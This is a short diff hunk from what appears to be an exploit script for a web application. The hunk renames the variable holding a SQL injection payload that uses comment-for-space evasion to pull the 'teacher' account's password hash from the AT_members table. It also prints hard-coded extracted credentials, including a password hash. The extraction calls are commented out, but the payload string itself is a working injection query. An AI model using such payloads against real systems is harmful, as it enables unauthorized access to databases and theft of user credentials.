@@ -136,8 +136,8 @@ def main():
     # username = extract_data(ip, username_injection_string)
     username = "teacher"
 
-    memeber_password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
-    # hash = extract_data(ip, memeber_password_injection_string)
+    password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
+    # hash = extract_data(ip, password_injection_string)
     hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
     print(f"Extracted Credentials: {username}, {hash}")
 
